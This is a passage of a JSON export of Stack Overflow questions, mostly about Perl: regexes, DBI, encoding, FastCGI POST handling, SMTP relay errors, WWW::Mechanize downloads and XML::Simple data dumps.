so...</p>\n"},{"tags":["python","regex","perl"],"answer_count":7,"favorite_count":7,"up_vote_count":6,"down_vote_count":0,"view_count":14407,"score":6,"question_id":640001,"title":"How can I remove text within parentheses with a regex?","body":"<p>I'm trying to handle a bunch of files, and I need to alter then to remove extraneous information in the filenames; notably, I'm trying to remove text inside parentheses. For example:</p>\n\n<pre><code>filename = \"Example_file_(extra_descriptor).ext\"\n</code></pre>\n\n<p>and I want to regex a whole bunch of files where the parenthetical expression might be in the middle or at the end, and of variable length.</p>\n\n<p>What would the regex look like?  Perl or Python syntax would be preferred.</p>\n"},{"tags":["regex","perl","quote"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12752115,"title":"Changing a regex to avoid quoted tokens","body":"<p>I have a handy-dandy regex provided from a <a href=\"http://stackoverflow.com/questions/12719935/regex-with-recursive-expression-to-match-nested-braces\">previous SO question</a>:</p>\n\n<pre><code>$regex = qr/\n    (sp\\s+              #start with 'sp'        \n    \\{                  #opening brace\n      (                 #save to $2\n         (?:            #either\n            \\{ (?-1) \\} #more braces and recurse\n            |           #or\n            [^{}]++     #non-brace characters\n         )*             #0 or more times\n      )                 #end $2\n    \\}                  #ending brace\n    )                   #end $1\n    /x;\n</code></pre>\n\n<p>I use it to extract textual structures from a file which are of the form <code>sp {}</code>, with possible further nesting of the curly braces. It correctly saves the following text in $1:</p>\n\n<pre><code>sp {foo {bar} baz}\n</code></pre>\n\n<p>But I've run into a problem: quoting. In the text I have, vertical bars can be used to quote:</p>\n\n<pre><code>sp {foo |}}}}bar}}}{{|}\n</code></pre>\n\n<p>That entire thing is one structure, but the current regex I have will only match <code>sp {foo |}</code>. The matter is further complicated because a vertical bar can be escaped within a quote\nusing a backslash:</p>\n\n<pre><code>sp {foo |}\\|bar|}\n</code></pre>\n\n<p>should also match. Does anyone have any ideas on how to soup-up this regex to handle quotes and quote escaping?</p>\n"},{"tags":["perl","dbi","dbd"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":12751437,"title":"Perl DBI Oracle not preserving column order after SELECT","body":"<p>I'm using Perl v5.12.3 built by ActiveState on Windows.  DBD::Oracle version 1.27.  DBI version 1.616.  I'm selecting the data below in this particular order and wanting the resulting data to be retrieved in that same order.  Below are the code samples and some examples.</p>\n\n<p>SQL Snippet (contents of $report_sql below)</p>\n\n<pre><code>select student_number, lastfirst, counselor, \n   a.dateenrolled as \"Date Enrolled 1\", a.dateleft as \"Date Left 1\", a.termid as \"Term ID 1\", a.course_number as \"Course Number 1\", \n   a.expression as \"Expression 1\", b.dateenrolled as \"Date Enrolled 2\", b.dateleft as \"Date Left 2\", \n   b.termid as \"Term ID 2\", b.course_number as \"Course Number 2\", b.expression as \"Expression 2\"\n</code></pre>\n\n<p>Perl code snippet</p>\n\n<pre><code>## run the resulting query\nmy $report_result = $dbh-&gt;prepare( $report_sql );\n$report_result-&gt;execute();   \nwhile( my $report_row = $report_result-&gt;fetchrow_hashref())\n        {\n            print Dumper(\\$report_row); ## contents of this posted below\n</code></pre>\n\n<p>Contents of print Dumper for $report_row</p>\n\n<pre><code>$VAR1 = \\{\n        'Expression 2' =&gt; 'x',\n        'LASTFIRST' =&gt; 'xx',\n        'Term ID 1' =&gt; 'xx',\n        'Date Enrolled 2' =&gt; 'xx',\n        'Course Number 1' =&gt; 'xx',\n        'Term ID 2' =&gt; 'xx',\n        'STUDENT_NUMBER' =&gt; 'xx',\n        'Date Left 2' =&gt; 'xx',\n        'Expression 1' =&gt; 'xx',\n        'COUNSELOR' =&gt; 'xx',\n        'Date Left 1' =&gt; 'xx',\n        'Course Number 2' =&gt; 'xx',\n        'Date Enrolled 1' =&gt; 'xx'\n      };\n</code></pre>\n\n<p>Order I EXPECTED it to be printed</p>\n\n<pre><code>$VAR1 = \\{\n        'STUDENT_NUMBER' =&gt; 'xx',\n        'LASTFIRST' =&gt; 'xx',\n        'COUNSELOR' =&gt; 'xx',\n        'Date Enrolled 1' =&gt; 'xx',\n        'Date Left 1' =&gt; 'xx',\n        'Term ID 1' =&gt; 'xx',\n        'Course Number 1' =&gt; 'xx',\n        'Expression 1' =&gt; 'xx',\n        'Date Enrolled 2' =&gt; 'xx',\n        'Date Left 2' =&gt; 'xx',\n        'Term ID 2' =&gt; 'xx',\n        'Course Number 2' =&gt; 'xx',\n        'Expression 2' =&gt; 'x'\n      };\n</code></pre>\n\n<p>One thing to note is that this query being ran is one of many that are being ran.  This particular script runs through a series of queries and generates reports based on the returned results.  The queries are stored in files on the hd alongside the perl script.  The queries are read in and then ran.  It's not always the same columns being selected.</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12751922,"title":"How to expand hash variables in string?","body":"<p>I have found ways of doing this if the variables in the string are simple scalars such as \"$foo = 5\" using regex. But the issue is what if the variable in the string is:\n$foo->{bar} which is equal to 5.</p>\n\n<p>So sample string is:</p>\n\n<p>\"This is a string with hash value of $foo->{bar}\".</p>\n\n<p>How can I expand that out to read:</p>\n\n<p>\"This is a string with hash value of 5\"</p>\n\n<p>Thanks.</p>\n\n<p>Edit for more explanation:</p>\n\n<p>I have a string literal (I believe? I am not the best at the vocab of this) that is \"Lorem Ipsum $foo->{bar} Lorem Ipsum\" that I received from some text source. I want to take that string, replace all the variable names with the actual value of the variable in my code.</p>\n"},{"tags":["arrays","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":86,"score":0,"question_id":12752045,"title":"Perl how to check if array is still empty?","body":"<p>This should be simple hopefully. I initialize an empty array, do a grep and place the results (if any) in it, and then check if it's empty. Like so:</p>\n\n<pre><code>my @match = ();\n@match = grep /$pattern/, @someOtherArray;\nif (#match is empty#) {\n    #do something!\n}\n</code></pre>\n\n<p>What's the standard way of doing this? </p>\n"},{"tags":["perl","email","openssl","sendmail","cpan"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":135,"score":2,"question_id":12750662,"title":"install perl module Net::SSLeay through cpan","body":"<p>I have tried to install Net::SSLeay though cpan to install Email::Send::SMTP::TLS but I am getting the following error.</p>\n\n<pre><code>cpan[5]&gt; install Net::SSLeay\nRunning install for module 'Net::SSLeay'\nRunning make for M/MI/MIKEM/Net-SSLeay-1.49.tar.gz\n  Has already been unwrapped into directory /home/ubuntu/.cpan/build/Net-SSLeay-1.49-VDZ57t\nCould not make: Unknown error\nRunning make test\n  Can't test without successful make\nRunning make install\n  Make had returned bad status, install seems impossible\n</code></pre>\n"},{"tags":["perl","encoding","decoding"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":76,"score":1,"question_id":12749971,"title":"In which cases does encode/decode utf8 croak?","body":"<p>This script gives me two times the same output. Are there encoding which would not survive the <code>utf8</code> <code>encode</code> and <code>decode</code> between the two <code>say</code>? </p>\n\n<pre><code>#!/usr/bin/env perl\nuse warnings;\nuse 5.16.1;\nuse Encode qw/encode decode/;\n\nmy $my_encoding = 'ISO-8859-7';\nbinmode STDOUT, \":encoding($my_encoding)\";\n\nmy $var = \"\\N{GREEK SMALL LETTER TAU}\";\n$var .= \"\\N{GREEK SMALL LETTER OMEGA WITH TONOS}\";\n$var .= \"\\N{GREEK CAPITAL LETTER UPSILON WITH DIALYTIKA}\";\n\n$var = encode( 'utf8', $var );\n$var = decode( $my_encoding, $var );\n\nsay $var;\n\nmy $test = encode( 'utf8', $var, Encode::FB_CROAK );\n$var = decode( 'utf8', $test, Encode::FB_CROAK  );\n\nsay $var;\n</code></pre>\n"},{"tags":["mysql","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12747918,"title":"How to run and link a .sql file from Perl","body":"<p>I am looking for a way to implement MySQL and Perl to make a program. Where I'm lost is that I have a .sql file, that creates 3 tables for the Perl program to use. How do you:</p>\n\n<p>1) Execute the file fileName.sql in Perl to create the tables</p>\n\n<p>2) Link those created tables into manipulable variables in Perl Program (like an example being able to add a user to one of the tables)</p>\n"},{"tags":["perl","hash","mapping"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":83,"score":2,"question_id":12748048,"title":"Why does a '1' get mapped to hash in perl?","body":"<p>I have some code like so:</p>\n\n<pre><code>print \"key $_ - $hJobT{$_}\\n\" foreach keys %hJobT;\n%hJobT = map { $_ =&gt; 1 } %hJobT;\nprint \"key $_ - $hJobT{$_}\\n\" foreach keys %hJobT;\n</code></pre>\n\n<p>When I run the program and print the results I get:</p>\n\n<pre><code>key office - 1\nkey recon - 1\nkey office - 1\nkey 1 - 1\nkey recon - 1\n</code></pre>\n\n<p>The first two results are from the first print statement and are expected. </p>\n\n<p>The <code>key 1 - 1</code> part is not expected. </p>\n\n<p>To clarify - the code is in a loop which as it iterates, the key-values increment in certain conditions. For testing purposes I put an exit statement at the end of the loop so it only shows the first iteration results, hence whey they are '1'. (Just so it doesn't seem like I'm mapping 1s to 1s pointlessly.) Any ideas as to why I get the 1-1 mapping? </p>\n"},{"tags":["regex","string","perl","match"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":59,"score":2,"question_id":12747558,"title":"Extract lines between two similar strings","body":"<p>I want to extract the lines between one given and one more or less random string. \nThe file looks like :</p>\n\n<pre><code>\\\\\\\\\\\n\\\\\\\\\\     start \n\\\\\\\\\\   \nlines\nto \nextract\n\\\\\\\\\\\n\\\\\\\\\\     &lt;any string&gt; (must not be start but could be sta*) \n\\\\\\\\\\\n</code></pre>\n\n<p>Until now I wasn't able to get the lines in between these two without explicitly knowing the second string. \nBy defining the second just as any possible characters using \\w or [a-zA-Z] perl seems to match the first line two times and therefore only printing \"    -----     start \" as result.</p>\n\n<p>Until now it looks like this : </p>\n\n<pre><code>open(FILE,'&lt;','file.txt') or die \"Could not open: $!\";\nwhile(&lt;FILE&gt;){\n  print $_ if (/^\\\\{5}     start$/ .. /^\\\\{5}     [a-zA-Z]/);\n}\n</code></pre>\n\n<p>and the output is:</p>\n\n<pre><code>\\\\\\\\\\     start\n</code></pre>\n\n<p>Hoping for some ideas.</p>\n"},{"tags":["perl","post","request","lighttpd","fcgi"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":153,"score":1,"question_id":12743751,"title":"FCGI+Perl+lighttpd: POST request is empty","body":"<p>I have lighttpd server with fastcgi on perl.\nLighttpd configuration:</p>\n\n<pre><code>server.modules = (\n        \"mod_access\",\n        \"mod_alias\",\n        \"mod_compress\",\n        \"mod_redirect\",\n        \"mod_rewrite\",\n        \"mod_accesslog\",\n)\n\nserver.document-root        = \"/var/www\"\nserver.upload-dirs          = ( \"/var/cache/lighttpd/uploads\" )\nserver.errorlog             = \"/var/log/lighttpd/error.log\"\nserver.pid-file             = \"/var/run/lighttpd.pid\"\nserver.username             = \"www-data\"\nserver.groupname            = \"www-data\"\n\nserver.max-keep-alive-requests = 10\nserver.max-keep-alive-idle = 5\n#server.max-fds = 10240\nserver.max-connections = 8192\n\nindex-file.names            = ( \"index.php\", \"index.html\",\n                                \"index.htm\", \"default.htm\",\n                                \"index.lighttpd.html\" )\n\nurl.access-deny             = ( \"~\", \".inc\" )\n\nstatic-file.exclude-extensions = ( \".php\", \".pl\", \".fcgi\" )\n\ndir-listing.encoding        = \"utf-8\"\nserver.dir-listing          = \"disable\"\n\ncompress.cache-dir          = \"/var/cache/lighttpd/compress/\"\ncompress.filetype           = ( \"application/x-javascript\", \"text/css\", \"text/html\", \"text/plain\" )\n\ninclude_shell \"/usr/share/lighttpd/create-mime.assign.pl\"\ninclude_shell \"/usr/share/lighttpd/include-conf-enabled.pl\"\n\n$HTTP[\"host\"] =~ \"(^|\\.)hostname\\.net$\" {\n    server.document-root = \"/var/www/hostname.net\"\n    url.rewrite-once = (     \n        \"^/index.php\" =&gt; \"/index.pl\",\n    )\n}\n</code></pre>\n\n<p>Fast CGI is enabled. Here configuration fcgi.server:</p>\n\n<pre><code>fastcgi.server += ( \".pl\" =&gt;\n        ((\n                \"socket\" =&gt; \"/tmp/perl.socket\" + var.PID,\n                \"bin-path\" =&gt; \"/usr/bin/dispatch.fcgi\",\n                \"docroot\" =&gt; \"/var/www/hostname.net\",\n                \"check-local\"     =&gt; \"disable\",\n        ))\n)\n</code></pre>\n\n<p>dispatch.fcgi:</p>\n\n<pre><code>use strict;\nuse CGI::Fast;\nuse Embed::Persistent; {\n    my $p = Embed::Persistent-&gt;new();\n    while (new CGI::Fast) {\n\n        my $filename = $ENV{SCRIPT_FILENAME};\n        my $package  = $p-&gt;valid_package_name($filename);\n        my $mtime;\n\n        if ($p-&gt;cached($filename, $package, \\$mtime)) {\n\n            eval {$package-&gt;handler;};\n        }\n        else {\n\n            $p-&gt;eval_file($ENV{SCRIPT_FILENAME});\n        }\n    }\n}\n</code></pre>\n\n<p>And here is my script (after editing):</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse CGI;\nmy $q = new CGI;\n\nopen my $fh, '&gt;', \"/var/www/hostname.net/payload.body\" or die \"Can't open payload.body: $!\";\n{\n local $/;\n print $fh $q-&gt;param('arg1');\n}\nclose $fh;\n\nprint $q-&gt;header;\nprint $q-&gt;param('arg1');\n</code></pre>\n\n<p>Send request:</p>\n\n<pre><code>wget --post-data=\"arg1=dfsdfasf&amp;arg2=sdfasfdsdf\" http://hostname.net/test.pl --save-headers --quiet -O -\n</code></pre>\n\n<p>payload.body is empty(but time of change updates) and dump is:</p>\n\n<pre><code>HTTP/1.0 200 OK\nContent-Type: text/html; charset=ISO-8859-1\nContent-Length: 0\nConnection: keep-alive\nDate: Fri, 05 Oct 2012 12:23:07 GMT\nServer: lighttpd/1.4.28\n</code></pre>\n\n<p>That's all.</p>\n\n<p>I tried get POST parameters by this way, but query comes empty. I so tried this way:</p>\n\n<pre><code>use Data::Dumper;\nmy $request;\nuse FCGI;\nmy $env;\nmy $q = FCGI::Request();\n$env = $q-&gt;GetEnvironment();\nmy $buffer = \"data\\n\";\n\nif ( $ENV{'REQUEST_METHOD'} eq \"POST\" ){\n\n    read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});\n}\nelse {\n\n    print (\"some error\");\n};\n\nprint(\"Content-type: text/plain\\r\\n\\r\\n\", Dumper($buffer),\"\\n\");\n</code></pre>\n\n<p>I need to get POST parameters from request (binary post data).</p>\n\n<p>Can you help me? Maybe i take post parameters by wrong way?</p>\n\n<p>Many thanks!</p>\n"},{"tags":["perl","cgi"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":107,"score":3,"question_id":12743143,"title":"New to Perl, where to start?","body":"<p>I moved to a team where they mainly work on perl. The focus is on extending command line tools and fixing some web scripts written in perl. I have never worked on perl before. Could you please guide me where to start learning perl? How to go about it? </p>\n\n<p>Could someone please suggest some books to start with and/or any good online tutorial.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["perl","text","binary-data","unpack"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":82,"score":1,"question_id":12744072,"title":"First 1000 bytes of a variable","body":"<p>Is this usage of <code>unpack</code> correct if I would like to try this guessing subroutine with the variables first 1000 bytes?</p>\n\n<pre><code>#!/usr/bin/env perl\nuse warnings;\nuse 5.10.1;\n\nmy $var = ...;\nmy $part = unpack( 'b1000', $var ) ;\n\nsub is_binary_data {\n    local $_ = shift;\n    (   tr/ -~//c / length  ) &gt;= .3;\n}\n\nif ( is_binary_data( $part ) ) {\n    say \"Binary\";\n}\nelse {\n    say \"Text\";\n}\n</code></pre>\n"},{"tags":["regex","perl","design-patterns","xslt"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":5,"view_count":42,"score":-5,"question_id":12743372,"title":"Reading and editing in an exisiting xsl through perl","body":"<p>Can you guys help me with searching for a specific string in an xls file using perl?  Once the pattern is found, then I want to replace that string with another string<br>\nI'm an expert in text file modifications, but I'm not sure in case of XLS</p>\n"},{"tags":["perl","email","smtp"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12743823,"title":"Net::smtp error,Connecting server is NOT authorised to relay","body":"<p>while running the below code , my mail are not getting delivered </p>\n\n<p>Am getting debug error as</p>\n\n<p>Net::SMTP=GLOB(123)&lt;&lt;&lt; 554-a.b.com</p>\n\n<p>Net::SMTP=GLOB(0)&lt;&lt;&lt; 554 Connection refused.  Connecting server is NOT a\nuthorized to relay mail through this server.\nCould not connect to server!</p>\n\n<pre><code>use Net::SMTP;\n\nuse Win32;\n\nmy $machinename;\n\n$machinename=Win32::NodeName();\n\nmy $smtpserver = 'a.b.com';\n\nmy $smtpuser = 'admin';\n\nmy $fromemail = 'q\\@b.com';\n\nmy @TO_ADDRESS = (\"c\\@b.com\");\n\n$smtp = Net::SMTP-&gt; new($smtpserver, Timeout =&gt; 10, Debug =&gt; 1);\n\ndie \"Could not connect to server!\\n\" unless $smtp;\n\n$smtp-&gt; mail($fromemail );\n\n$smtp-&gt; to(@TO_ADDRESS);\n\n$smtp-&gt; data();\n\n$smtp-&gt; datasend(\"To: @TO_ADDRESS\\n\");\n\n$smtp-&gt; datasend(\"From: q\\@b.com\\n\");\n\n$smtp-&gt; datasend(\"Subject:  \\n\");\n\n$smtp-&gt; datasend(\"\\n\");\n$smtp-&gt; datasend(\"Region is \\n\");\n\n$smtp-&gt; datasend(\"Server name is \\n\");\n\n$smtp-&gt; datasend(\"hi.\\n\"); \n\n$smtp-&gt; dataend();\n\n$smtp-&gt; quit;\n</code></pre>\n\n<p>Please advice....</p>\n"},{"tags":["perl","apache","http","http-headers","cgi"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1025,"score":1,"question_id":4949276,"title":"How to fetch HTTP headers in perl when using CGI","body":"<p>I'm using Perl/CGI/Apache and want to fetch the X-Forwarded-For HTTP header. How do I do that?</p>\n"},{"tags":["perl","windows-7"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":88,"score":-1,"question_id":12370450,"title":"I am running a Perl script in Windows 7 and have issues about finding PID of the currently running batch file","body":"<p>I am starting the new independent Perl script[using system(Start command)] from the the parent perl script. I am writing the PID of the child script into one file and I read it in the parent script so that whenever I want to end the child process I can simply kill using its PID.  </p>\n\n<p>But I am calling another batch file using the child process ex system(\"somebatchfile) from the child script. Here My PID will change and I am unable to close it until batch file finishes it's work. I am unable to get the PID of the batch file. I tried using the fork function but anyway calling a batch file will create other PID of its own.</p>\n\n<p>My code is as follows.</p>\n\n<p>Parent script: start a new script and read PID and kill the started script if needed.</p>\n\n<p>Child script:</p>\n\n<pre><code>open(PID,\"&gt;PID_Value.txt\");\nprint PID \"\\$Process_id=$$\"; # write the PID of child script\nclose(PID);\nsystem(\"somebatch file name\"); # I am using Windows 7\n</code></pre>\n"},{"tags":["perl","matrix"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":94,"score":4,"question_id":12395847,"title":"Identifying subarrays in matrices in Perl","body":"<p>I am relatively new to Perl, and I need to make a relatively sophisticated matricial computation and don't know what data structures to use. </p>\n\n<p>Not sure if this is the appropriate forum for this, but say you have following matrix in a <strong>multi-dimensional array</strong> in Perl:</p>\n\n<pre><code>0.2    0.7    0.2 \n0.6    0.8    0.7\n0.6    0.1    0.8\n0.1    0.2    0.9\n0.6    0.3    0.0\n0.6    0.9    0.2\n</code></pre>\n\n<p>I am trying to identify <strong>column segments</strong> in this Matrix corresponding to continuous values that are higher than a given threshold, e.g. <strong>0.5</strong></p>\n\n<p>For example, if we threshold this matrix, we have:</p>\n\n<pre><code>0    1    0 \n1    1    1\n1    0    1\n0    0    1\n1    0    0\n1    1    0\n</code></pre>\n\n<p>If we now focus on the first column:</p>\n\n<pre><code>0 \n1 \n1\n0 \n1 \n1\n</code></pre>\n\n<p>we can see that there are two continuous segments: </p>\n\n<blockquote>\n  <p>0 <strong>1 1</strong> 0 <strong>1 1</strong></p>\n</blockquote>\n\n<ul>\n<li>The first <strong>track</strong> (sequence of ones) starts with index <strong>1</strong> and ends with index <strong>2</strong></li>\n<li>The second <strong>track</strong> (sequence of ones) starts with index <strong>4</strong> and ends with index <strong>5</strong></li>\n</ul>\n\n<p>I would like to detect all such tracks in the original matrix, but I don't know how to proceed or what Perl data structures are most appropriate for this.</p>\n\n<p>Ideally I would like something easy to index, e.g. assuming that we use the variable <code>tracks</code>, I can store the indices for the first column (index 0) as follows:</p>\n\n<pre><code># First column, first track\n$tracks{0}{0}{'start'} = 1; \n$tracks{0}{0}{'end'}   = 2;\n\n# First column, second track\n$tracks{0}{1}{'start'} = 4; \n$tracks{0}{1}{'end'}   = 5;\n\n# ...\n</code></pre>\n\n<p>What are good data structures and/or libraries I can use to approach this problem in Perl? </p>\n"},{"tags":["perl","file-download","form-submit","www-mechanize"],"answer_count":3,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":2475,"score":3,"question_id":1727923,"title":"How do I download a file with WWW::Mechanize after it submits a form?","body":"<p>I have the code:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse WWW::Mechanize;\n\nmy $url = 'http://divxsubtitles.net/page_subtitleinformation.php?ID=111292';\nmy $m = WWW::Mechanize-&gt;new(autocheck =&gt; 1);\n$m-&gt;get($url);\n$m-&gt;form_number(2);\n$m-&gt;click();\nmy $response = $m-&gt;res();\nprint $m-&gt;response-&gt;headers-&gt;as_string;\n</code></pre>\n\n<p>It submits the download button on the page, but I'm not sure how to download the file which is sent back after the POST.</p>\n\n<p>I'm wanting a way to download this with wget if possible. I was thinking that their may be a secret url passed or something? Or will I have to download it with LWP directly from the response stream?</p>\n\n<p>So how do I download the file that is in that header?</p>\n\n<p>Thanks,</p>\n\n<p>Cody Goodman</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":140,"score":-1,"question_id":12702857,"title":"Database - SQL Table to Perl Script","body":"<p>I have a 'transaction' table created in SQL like this:</p>\n\n<pre><code>TransactionID    Date           AccountNumber   Type    Amount  \n657520           02-07-1999     016901581432    Debit   16000  \n657524           02-07-1999     016901581432    Debit   13000  \n657538           09-07-1999     016901581432    Credit  11000  \n657548           18-07-1999     016901581432    Credit  15500  \n657519           02-07-1999     016901581433    Debit   12000  \n657523           02-07-1999     016901581433    Credit  11000  \n657529           03-07-1999     016901581433    Debit   15000  \n657539           10-07-1999     016901581433    Credit  10000  \n657541           11-07-1999     016901581434    Debit   12000  \n657525           03-07-1999     016901581434    Debit   15000  \n657533           05-07-1999     016901581434    Credit  12500  \n</code></pre>\n\n<p>I have to find the total debit amount and total credit amount for each account using database.\nMy code is like this:</p>\n\n<pre><code>#!/usr/bin/perl\nuse DBI;\nuse strict;\nuse warnings;\nprint \"content-type:text/html\\n\\n\";\n$dbh = DBI-&gt;connect('dbi:___','prithvi','*password*') or die \"Couldn't connect\";\nmy %trans;\nmy $tran = $dbh-&gt;prepare(\"SELECT * FROM `transaction` LIMIT 0 , 11\");\n$tran-&gt;execute;\nwhile(my @row = $tran-&gt;fetchrow_hash) \n{\n    my $tran = join ',', @row;\n    $trans{$tran[2]}{$tran[3]} += $tran[4];\n}\nforeach my $acno(sort keys %trans) \n{\nprint \"Total Amount deposited and total amount credited for Account Number $acno is Rs.$trans{$acno}{'Debit'} and Rs.$trans{$acno}{'Credit'}\\n\";\n}\n$tran-&gt;finish;\n$dbh-&gt;disconnect;\n</code></pre>\n\n<p>Where am I going wrong?</p>\n"},{"tags":["perl","komodo"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":328,"score":1,"question_id":9448655,"title":"Perl script compilation into .exe error","body":"<p>I am trying to create a .exe in perl. It works fine until I try to compile it into an exe. I am using Komodo IDE 5. I have posted my script and the error below. I have added the modules, LWP::UserAgent, NET, and Google::Voice and it still doesnt work. I use perlapp to create the .exe</p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\nuse warnings;\nuse Google::Voice;\nuse Date::Calc qw(Delta_Days);\nuse Net::Twitter;\n\n#Set Days\n    my @today = (localtime)[5,4,3];\n    $today[0] += 1900;\n    $today[1]++;\n    my @RT = (2012, 7, 7);\n    my $days = Delta_Days(@today, @RT);\n\n#Get Quotes and Phone Numbers\n    open FILE, \"c:/Countdown/countdownNumbers.txt\" or die \"Couldn't open file: $!\"; \n    my $numbers = join(\"\", &lt;FILE&gt;); \n    close FILE;\n    open FILETWO, \"c:/Countdown/Quotes.txt\" or die \"Couldn't open file: $!\"; \n    my $quotes = join(\"\", &lt;FILETWO&gt;); \n    close FILETWO;\n\n#Create Arrays and Lengths\n    my @numbersArray = split(/[\\n\\r\\l]+/, $numbers);\n    my @quotesArray = split(/[\\n\\r\\l]+/, $quotes);\n    my $length = @numbersArray;\n    my $QuotesLength = @quotesArray;\n\n#Send Text Message\n    for(my $i = 0; $i &lt; $length; $i++){\n        my $g = Google::Voice-&gt;new-&gt;login('secret', 'secret'); \n        $g-&gt;send_sms($numbersArray[$i] =&gt; \"      Countdown\\nDays Left: \" . $days . \"\\n Quote:\\n\" . $quotesArray[0]);\n    }\n\n\n#Send Twitter Message\n    my $nt = Net::Twitter-&gt;new(\n        traits   =&gt; [qw/OAuth API::REST/],\n        consumer_key        =&gt; 'secret',\n        consumer_secret     =&gt; 'secret',\n        access_token        =&gt; 'secret',\n        access_token_secret =&gt; 'secret'\n    );\n    my $result = $nt-&gt;update($days .' Days left!');\n    $result = $nt-&gt;update('Quote: ' . $quotesArray[0]);\n\n#Rewrite the file and close it\n    open FILETWO, \"&gt;c:/Countdown/Quotes.txt\";\n    for(my $i = 1; $i &lt; $QuotesLength; $i++){\n        print FILETWO $quotesArray[$i] . \"\\n\";\n    }\n    close FILETWO;\n</code></pre>\n\n<p>errors</p>\n\n<pre><code>Algorithm\\Diff\\XS.pm:\n    error: Can't locate Algorithm\\Diff\\XS.pm\n    refby: C:\\Perl\\site\\lib\\Array\\Diff.pm line 7\nDate\\Calc\\XS.pm:\n    error: Can't locate Date\\Calc\\XS.pm\n    refby: C:\\Perl\\lib\\Date\\Calc.pm line 26\nI18N\\Langinfo.pm:\n    error: Can't locate I18N\\Langinfo.pm\n    refby: C:\\Perl\\lib\\Encode\\Locale.pm line 51\nJSON\\PP58.pm:\n    error: Can't locate JSON\\PP58.pm\n    refby: C:\\Perl\\lib\\JSON\\PP.pm\nNet.pm:\n    error: Can't locate Net.pm\n    refby: perlapp --add Net::\n\nCan't locate Mojo/EventEmitter.pm in @INC (@INC contains:) at /&lt;C:\\Users\\Chris\\Desktop\\Countdown\\RT.exe&gt;Mojo/Base.pm line 32.\nBEGIN failed--compilation aborted at /&lt;C:\\Users\\Chris\\Desktop\\Countdown\\RT.exe&gt;Mojo/UserAgent.pm line 2.\nBEGIN failed--compilation aborted at /&lt;C:\\Users\\Chris\\Desktop\\RTCountdown\\RT.exe&gt;Google/Voice.pm line 6.\nBEGIN failed--compilation aborted at RT.pl line 4.\n</code></pre>\n"},{"tags":["arrays","perl","hash","data-dumper"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":65,"score":1,"question_id":12739431,"title":"Perl Data::Dumper hashes inside array?","body":"<p>I have a program that parses some XML using <code>XML::Simple</code>. It appears at some point the XML has redundant entries in it that get serialized, but I can't for the life of me figure out how to get that data back as a simple string. There is a subset of this XML that appears that it is being put into an array by <code>XML::Simple</code>. The pertinent subsection is as follows when running a <code>Dumper($data)</code> where data is my parsed XML.</p>\n\n<pre><code>Audio = [\n      {\n        'AudioIndex' =&gt; {\n                        'StartByteOffset' =&gt; '32768',\n                        'DataSize' =&gt; '3071872'\n                      },\n        'SamplingRate' =&gt; '48000',\n        'BitsPerSample' =&gt; '16',\n        'AudioFormat' =&gt; 'MXF'\n      },\n      {\n        'AudioIndex' =&gt; {\n                        'StartByteOffset' =&gt; '32768',\n                        'DataSize' =&gt; '3071872'\n                      },\n        'SamplingRate' =&gt; '48000',\n        'BitsPerSample' =&gt; '16',\n        'AudioFormat' =&gt; 'MXF'\n      },\n      {\n        'AudioIndex' =&gt; {\n                        'StartByteOffset' =&gt; '32768',\n                        'DataSize' =&gt; '3071872'\n                      },\n        'SamplingRate' =&gt; '48000',\n        'BitsPerSample' =&gt; '16',\n        'AudioFormat' =&gt; 'MXF'\n      },\n      {\n        'AudioIndex' =&gt; {\n                        'StartByteOffset' =&gt; '32768',\n                        'DataSize' =&gt; '3071872'\n                      },\n        'SamplingRate' =&gt; '48000',\n        'BitsPerSample' =&gt; '16',\n        'AudioFormat' =&gt; 'MXF'\n      }\n    ];\n</code></pre>\n\n<p>I pass a small subset of my XML parsed output to a variable like so:</p>\n\n<p><code>\n    my @audiostuff = $data-&gt;{ClipContent}-&gt;{EssenceList}-&gt;{Audio};\n</code></p>\n\n<p>When I output the dump of this, i get the following</p>\n\n<pre><code>$VAR1 = [\n      {\n        'AudioIndex' =&gt; {\n                        'StartByteOffset' =&gt; '32768',\n                        'DataSize' =&gt; '3071872'\n                      },\n        'SamplingRate' =&gt; '48000',\n        'BitsPerSample' =&gt; '16',\n        'AudioFormat' =&gt; 'MXF'\n      },\n      {\n        'AudioIndex' =&gt; {\n                        'StartByteOffset' =&gt; '32768',\n                        'DataSize' =&gt; '3071872'\n                      },\n        'SamplingRate' =&gt; '48000',\n        'BitsPerSample' =&gt; '16',\n        'AudioFormat' =&gt; 'MXF'\n      },\n      {\n        'AudioIndex' =&gt; {\n                        'StartByteOffset' =&gt; '32768',\n                        